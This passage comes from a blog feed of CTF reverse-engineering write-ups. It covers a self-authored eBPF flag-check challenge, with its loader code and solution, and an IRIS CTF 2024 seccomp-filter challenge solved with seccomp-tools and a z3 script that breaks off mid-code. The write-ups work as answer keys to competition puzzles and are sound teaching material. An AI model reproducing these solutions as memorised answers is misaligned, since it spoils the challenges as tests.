(almost line-by-line) representation of the encryption is as follows:<br />\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">check</span>(<span class=\"params\">r5</span>):</span><br><span class=\"line\">    r7 = r5</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[*] Initial state of r5: <span class=\"subst\">&#123;<span class=\"string\">&#x27;&#123;:08b&#125;&#x27;</span>.<span class=\"built_in\">format</span>(r5)&#125;</span>&quot;</span>)</span><br><span class=\"line\">    r7 &amp;= <span class=\"number\">15</span></span><br><span class=\"line\">    r7 &lt;&lt;= <span class=\"number\">4</span></span><br><span class=\"line\">    r5 &amp;= <span class=\"number\">240</span></span><br><span class=\"line\">    r5 &gt;&gt;= <span class=\"number\">4</span></span><br><span class=\"line\">    r5 |= r7</span><br><span class=\"line\">    r7 = r5</span><br><span class=\"line\">    r7 &amp;= <span class=\"number\">51</span></span><br><span class=\"line\">    r7 &lt;&lt;= <span class=\"number\">2</span></span><br><span class=\"line\">    r5 &gt;&gt;= <span class=\"number\">2</span></span><br><span class=\"line\">    r5 &amp;= <span class=\"number\">51</span></span><br><span class=\"line\">    r5 |= r7</span><br><span class=\"line\">    r7 = r5</span><br><span class=\"line\">    r7 &amp;= <span class=\"number\">85</span></span><br><span class=\"line\">    r7 &lt;&lt;= <span class=\"number\">1</span></span><br><span class=\"line\">    r5 &gt;&gt;= <span class=\"number\">1</span></span><br><span class=\"line\">    r5 &amp;= <span class=\"number\">85</span></span><br><span class=\"line\">    r5 |= r7</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;\\n\\n[*] Final state of r5: <span class=\"subst\">&#123;<span class=\"string\">&#x27;&#123;:08b&#125;&#x27;</span>.<span class=\"built_in\">format</span>(r5)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"interacting-with-the-program\"><a class=\"anchor\" href=\"#interacting-with-the-program\">#</a> Interacting with the program?</h2>\n<p>This is all very nice, but what's a program that you cannot interact with?</p>\n<p>Well, since this is an eBPF program, it'll have to be loaded on the kernel and get past the verifier first, before we can actually make the syscall  <code>0x31337</code>  to trigger it.</p>\n<p>How do we do that?</p>\n<p>You can use this loader file to load the program and simultaneously read  <code>trace_pipe</code>  (where the outputs of  <code>bpf_trace_printk</code> ) are logged.</p>\n<p>(Run this shell script first)</p>\n<p><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo clang -O2 -target bpf -D__TARGET_ARCH_x86_64 -I . -c <span class=\"string\">&quot;<span class=\"variable\">$1</span>&quot;</span>_challenge.c -o <span class=\"variable\">$1</span>.o</span><br><span class=\"line\">sudo bpftool gen skeleton <span class=\"variable\">$1</span>.o &gt; <span class=\"variable\">$1</span>.skel.h</span><br><span class=\"line\">sudo clang -g -O2 -Wall -I . -c loader.c -o loader.o</span><br><span class=\"line\">sudo clang -Wall -O2 -g loader.o libbpf/build/libbpf/libbpf.a -lelf -lz -o loader</span><br><span class=\"line\">sudo ./loader</span><br></pre></td></tr></table></figure></p>\n<p>(Then, run this file to load the program)<br />\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/types.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/stat.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/resource.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;bpf/libbpf.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;bpf/bpf.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;final.skel.h&quot;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">read_trace_pipe</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> trace_fd;</span><br><span class=\"line\"></span><br><span class=\"line\">\ttrace_fd = open(<span class=\"string\">&quot;/sys/kernel/debug/tracing/trace_pipe&quot;</span>, O_RDONLY, <span class=\"number\">0</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (trace_fd &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">while</span> (<span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">\t\t<span class=\"type\">static</span> <span class=\"type\">char</span> buf[<span class=\"number\">4096</span>];</span><br><span class=\"line\">\t\t<span class=\"type\">ssize_t</span> sz;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tsz = read(trace_fd, buf, <span class=\"keyword\">sizeof</span>(buf) - <span class=\"number\">1</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (sz &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">\t\t\tbuf[sz] = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">puts</span>(buf);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"keyword\">final</span> *<span class=\"title\">obj</span>;</span></span><br><span class=\"line\">\t<span class=\"type\">int</span> err = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">rlimit</span> <span class=\"title\">rlim</span> =</span> &#123;</span><br><span class=\"line\">\t\t.rlim_cur = <span class=\"number\">512UL</span> &lt;&lt; <span class=\"number\">20</span>,</span><br><span class=\"line\">\t\t.rlim_max = <span class=\"number\">512UL</span> &lt;&lt; <span class=\"number\">20</span>,</span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">\terr = setrlimit(RLIMIT_MEMLOCK, &amp;rlim);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (err) &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;failed to change rlimit\\n&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\tobj = final__open();</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!obj) &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;failed to open and/or load BPF object\\n&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\terr = final__load(obj);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (err) &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;failed to load BPF object %d\\n&quot;</span>, err);</span><br><span class=\"line\">\t\t<span class=\"keyword\">goto</span> cleanup;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\terr = final__attach(obj);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (err) &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;failed to attach BPF programs\\n&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">goto</span> cleanup;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tread_trace_pipe();</span><br><span class=\"line\"></span><br><span class=\"line\">cleanup:</span><br><span class=\"line\">\tfinal__destroy(obj);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> err != <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>Once loaded, you can write a python program to trigger the syscall with the arguments that you want to test it out (I used the   <code>ctypes</code>  module for this)</p>\n<p>&lt;br&gt;</p>\n<h2 id=\"the-solution\"><a class=\"anchor\" href=\"#the-solution\">#</a> The Solution</h2>\n<p>Once you understand how the program manipulates your input, reversing it becomes quite trivial. The program simply takes each byte of your input, flips the bits (8 padded), then compares it with a preexisting array.</p>\n<p><figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">compArray = [<span class=\"number\">86</span>, <span class=\"number\">174</span>, <span class=\"number\">206</span>, <span class=\"number\">236</span>, <span class=\"number\">250</span>, <span class=\"number\">44</span>, <span class=\"number\">118</span>, <span class=\"number\">246</span>, <span class=\"number\">46</span>, <span class=\"number\">22</span>, <span class=\"number\">204</span>, <span class=\"number\">78</span>, <span class=\"number\">250</span>, <span class=\"number\">174</span>, <span class=\"number\">206</span>, <span class=\"number\">204</span>, <span class=\"number\">78</span>, <span class=\"number\">118</span>, <span class=\"number\">44</span>, <span class=\"number\">182</span>, <span class=\"number\">166</span>, <span class=\"number\">2</span>, <span class=\"number\">70</span>, <span class=\"number\">150</span>, <span class=\"number\">12</span>, <span class=\"number\">206</span>, <span class=\"number\">116</span>, <span class=\"number\">150</span>, <span class=\"number\">118</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> compArray: </span><br><span class=\"line\">    i = <span class=\"string\">&#x27;&#123;:08b&#125;&#x27;</span>.<span class=\"built_in\">format</span>(i) </span><br><span class=\"line\">    i = i[::-<span class=\"number\">1</span>]</span><br><span class=\"line\">    i = <span class=\"built_in\">int</span>(i, <span class=\"number\">2</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"built_in\">chr</span>(i), end = <span class=\"string\">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure></p>\n<p>And that was my challenge! I hope you had fun solving it and (hopefully) also learned something new while doing it. üòÉ</p>\n",
            "tags": [
                "Writeup",
                "Security",
                "Reversing",
                "CTF",
                "eBPF",
                "Writeup"
            ]
        },
        {
            "id": "https://the-m3chanic.github.io/2024/01/26/Writeup-Secure-Computing-IRIS-CTF-2024/",
            "url": "https://the-m3chanic.github.io/2024/01/26/Writeup-Secure-Computing-IRIS-CTF-2024/",
            "title": "Secure Computing - Iris CTF 2024 Writeup",
            "date_published": "2024-01-26T01:12:26.000Z",
            "content_html": "<p>Note: My team and I didn't end up solving this during the CTF, we got very close though. This writeup goes through the steps I took to finish solving the challenge after the CTF ended. Hopefully you learn a thing or two üòÉ</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Your own secure computer can check the flag! Might have forgotten to add the logic to the program, but I think if you guess enough, you can figure it out. Not sure</span><br></pre></td></tr></table></figure></p>\n<p>The description seems to hint at something related to &quot;secure computing&quot;, and so does the challenge name. Interesting, we shall see.</p>\n<h2 id=\"understanding-the-challenge\"><a class=\"anchor\" href=\"#understanding-the-challenge\">#</a> Understanding the challenge</h2>\n<p>Opening the file up in IDA, we see this</p>\n<p><img data-src=\"/images/post_images/Writeup-Secure-Computing-IRIS-CTF/IDA_main.png\" alt=\"IDA main\" /></p>\n<p>It's passing our input (flag) as arguments to a syscall, in the form of 6 Qwords.<br />\nCalling syscall <em>0x1337</em> seems a little odd - because it obviously does not <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jaHJvbWl1bS5nb29nbGVzb3VyY2UuY29tL2Nocm9taXVtb3MvZG9jcy8rL21hc3Rlci9jb25zdGFudHMvc3lzY2FsbHMubWQ=\">exist</span> - so what's going on here?</p>\n<p>A quick google search with select keywords seems to point us in a single direction</p>\n<p><img data-src=\"/images/post_images/Writeup-Secure-Computing-IRIS-CTF/keyword_search.png\" alt=\"keyword search\" /></p>\n<p>&lt;br&gt;</p>\n<p>The man page of the  <code>seccomp</code>  syscall gives us this<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">The seccomp() system call operates on the Secure Computing (seccomp) state </span><br><span class=\"line\">of the calling process.</span><br></pre></td></tr></table></figure><br />\n<strong>What does that mean?</strong></p>\n<h2 id=\"understanding-seccomp\"><a class=\"anchor\" href=\"#understanding-seccomp\">#</a> Understanding Seccomp</h2>\n<p>Seccomp (or Secure Computing) is a security feature in the Linux kernel that provides an additional layer of protection for applications by restricting the system calls that they make. System calls are the interface between user-space applications and the kernel, allowing programs to request services from the operating system.</p>\n<p>Some important (and interesting) features of Seccomp:</p>\n<ul>\n<li>It allows you to define a filter that specifies which system calls are permitted for a particular process. By default, all syscalls are allowed, but with seccomp, you can create a &quot;policy&quot; that restricts this set.</li>\n<li>It uses BPF (Berkeley Packet Filter), which is a virtual machine that can execute a set of instructions to filter system calls. Think of BPF as a &quot;javascript for your kernel&quot;, because it resides in a VM on the kernel and responds to specific events that occur on the system to which it is attached. The filters are written using BPF assembly or even C, which are then compiled to BPF bytecode.</li>\n<li>It offers mainly 2 modes of operation - <em>strict</em> &amp; <em>filter</em>. In strict mode, the process starts with a seccomp filter in place, and any attempt to make an unallowed system call results in the termination of the process. Whereas in filter mode, the filter is applied only when explicitly requested by the process (we will look at the &quot;how&quot; of this later).</li>\n</ul>\n<p>Looking for syscalls with the calling number  <code>317</code>  (seccomp's syscall number), we find this</p>\n<p><img data-src=\"/images/post_images/Writeup-Secure-Computing-IRIS-CTF/syscall_1337.png\" alt=\"Seccomp syscall\" /></p>\n<p>Hmm, let's look at the arguments passed to it<br />\nThe prototype of the seccomp syscall looks like this:<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">syscall(SYS_seccomp, unsigned int operation, unsigned int flags, void *args);</span><br></pre></td></tr></table></figure></p>\n<p>Here, it seems like  <code>operation</code>  is set to 1<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">The system calls allowed are defined by a pointer to a Berkeley Packet </span><br><span class=\"line\">Filter (BPF) passed via args.  This argument is a pointer to a struct </span><br><span class=\"line\">sock_fprog; it can be designed to filter arbitrary system calls and </span><br><span class=\"line\">system call arguments.  If the filter is invalid, seccomp() fails,</span><br><span class=\"line\">returning EINVAL in errno.</span><br></pre></td></tr></table></figure></p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">In order to use the SECCOMP_SET_MODE_FILTER operation, either the calling </span><br><span class=\"line\">thread must have the CAP_SYS_ADMIN capability in its user namespace, or the </span><br><span class=\"line\">thread must already have the no_new_privs bit set.  If that bit was not </span><br><span class=\"line\">already set by an ancestor of this thread, the thread must make the following</span><br><span class=\"line\">call:</span><br><span class=\"line\"></span><br><span class=\"line\">    prctl(PR_SET_NO_NEW_PRIVS, 1);</span><br></pre></td></tr></table></figure></p>\n<p>Both of these are being done in our binary. Let us see what the man page says about those BPF instructions containing the actual filters for our input, which will allow us to solve the challenge.</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">When adding filters via SECCOMP_SET_MODE_FILTER, args points to a filter</span><br><span class=\"line\">program:</span><br><span class=\"line\"></span><br><span class=\"line\">   struct sock_fprog &#123;</span><br><span class=\"line\">       unsigned short      len;    /* Number of BPF instructions */</span><br><span class=\"line\">       struct sock_filter *filter; /* Pointer to array of</span><br><span class=\"line\">                                      BPF instructions */</span><br><span class=\"line\">   &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">Each program must contain one or more BPF instructions:</span><br><span class=\"line\"></span><br><span class=\"line\">   struct sock_filter &#123;            /* Filter block */</span><br><span class=\"line\">       __u16 code;                 /* Actual filter code */</span><br><span class=\"line\">       __u8  jt;                   /* Jump true */</span><br><span class=\"line\">       __u8  jf;                   /* Jump false */</span><br><span class=\"line\">       __u32 k;                    /* Generic multiuse field */</span><br><span class=\"line\">   &#125;;</span><br></pre></td></tr></table></figure></p>\n<p>Found our instructions!<br />\nSo now our approach would be to extract these instructions and disassemble the BPF bytes to see if we can make sense of the filter and reverse it. But let's see if any tool exists that can already do it for us, just to make our lives a little easier üòÉ</p>\n<p>Another quick google search leads us to <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2RhdmlkOTQyai9zZWNjb21wLXRvb2xz\">seccomp-tools</span>, something that exactly matches the description of what we're looking for.</p>\n<p>To extract the filters from the binary, we simply run:<br />\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">seccomp-tools dump ./chal</span><br></pre></td></tr></table></figure></p>\n<p>But doing this yields no result, why's that?<br />\nReading the GitHub page of seccomp-tools, we can see this<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Dumps the seccomp BPF from an execution file. This work is done by utilizing </span><br><span class=\"line\">the ptrace syscall.</span><br></pre></td></tr></table></figure><br />\nAnd we have a ptrace syscall in our binary, which is obviously causing the issue - so let's patch that out.</p>\n<p>Now running seccomp-tools:<br />\n<img data-src=\"/images/post_images/Writeup-Secure-Computing-IRIS-CTF/seccomp_dump.png\" alt=\"image\" /></p>\n<p>Bingo!</p>\n<p>But one thing we have to keep in mind, is the loop in which  <code>seccomp</code>  is being called. Note that it is not just one filter being set, it is <em>eight</em> of them.</p>\n<p><img data-src=\"/images/post_images/Writeup-Secure-Computing-IRIS-CTF/8-filters.png\" alt=\"image\" /></p>\n<p><code>v0</code>  is acting as the loop constraint here, making it run for 8 times, meaning 8 filters being set.<br />\nTo dump all 8 filters, we can use the  <code>-l</code>  flag with seccomp-tools.<br />\nAnd to clear out all the other garbage being printed along with the output, we can use a little bit of bash.</p>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">seccomp-tools dump ./chal -l 8 | grep -v <span class=\"string\">&quot;=======|CODE&quot;</span> | <span class=\"built_in\">cut</span> -d<span class=\"string\">&quot; &quot;</span> -f7- &gt; disasm.txt</span><br></pre></td></tr></table></figure></p>\n<p>Now that we have all 8 filters in a single file, time to solve for the constraints.</p>\n<h2 id=\"solving-the-challenge\"><a class=\"anchor\" href=\"#solving-the-challenge\">#</a> Solving the challenge</h2>\n<p>Looking at the file (and from the challenge, too), we can see that we'll have 6 QWORDS to input, which it checks and returns  <code>KILL</code>  if it's wrong and  <code>ERRNO(0)</code>  if it's correct.<br />\nFirst thing that comes to mind is z3, so let's go for that.</p>\n<p>Here is my script to parse the file and add constraints and &quot;emulate&quot; the filter on my args</p>\n<p><figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> z3 <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># solver</span></span><br><span class=\"line\">s = Solver()</span><br><span class=\"line\">INT_BITS = <span class=\"number\">32</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">getFlag</span>(<span class=\"params\">model</span>):</span><br><span class=\"line\">    flag = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">6</span>):</span><br><span class=\"line\">        t = model[args[i]].as_long()</span><br><span class=\"line\">        flag += <span class=\"built_in\">bytes</span>.fromhex(<span class=\"built_in\">hex</span>(t)[<span class=\"number\">2</span>:]).decode()[::-<span class=\"number\">1</span>]</span><br><span class=\"line\">        t = model[args2[i]].as_long()</span><br><span class=\"line\">        flag += <span class=\"built_in\">bytes</span>.fromhex(<span class=\"built_in\">hex</span>(t)[<span class=\"number\">2</span>:]).decode()[::-<span class=\"number\">1</span>]</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] Flag: irisctf&#123;&#123;<span class=\"subst\">&#123;flag&#125;</span>&#125;&#125;&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># using BitVecVals instead of python integers because </span></span><br><span class=\"line\"><span class=\"comment\"># they act like a &quot;constant symbol&quot;, and automatically get </span></span><br><span class=\"line\"><span class=\"comment\"># truncated according to size, etc </span></span><br><span class=\"line\">A = BitVecVal(<span class=\"number\">0</span>, INT_BITS)</span><br><span class=\"line\">X = BitVecVal(<span class=\"number\">0</span>, INT_BITS)</span><br><span class=\"line\">sys_number = BitVecVal(<span class=\"number\">0x1337</span>, INT_BITS)</span><br><span class=\"line\">arch = BitVecVal(<span class=\"number\">0xc000003e</span>, INT_BITS)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># splitting our qwords into pairs of dwords, higher and lower </span></span><br><span class=\"line\"><span class=\"comment\"># since bpf uses only 32-bit integers at a maximum anyways </span></span><br><span class=\"line\">args = []</span><br><span class=\"line\">args2 = []</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># zero initialised since mem is being initialised in the program </span></span><br><span class=\"line\">mem = [<span class=\"number\">0</span>] * <span class=\"number\">16</span></span><br><span class=\"line\">       </span><br><span class=\"line\"><span class=\"comment\"># args is lower DWORD</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">6</span>):</span><br><span class=\"line\">    x = BitVec(<span class=\"string\">f&quot;args[<span class=\"subst\">&#123;i&#125;</span>]&quot;</span>, <span class=\"number\">32</span>)</span><br><span class=\"line\">    args.append(x)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>, <span class=\"number\">32</span>, <span class=\"number\">8</span>):</span><br><span class=\"line\">        s.add(Extract(j + <span class=\"number\">7</span>, j, x) &gt;= <span class=\"number\">32</span>)</span><br><span class=\"line\">        s.add(Extract(j + <span class=\"number\">7</span>, j, x) &lt;=<span class=\"number\">127</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># args2 is higher DWORD </span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span 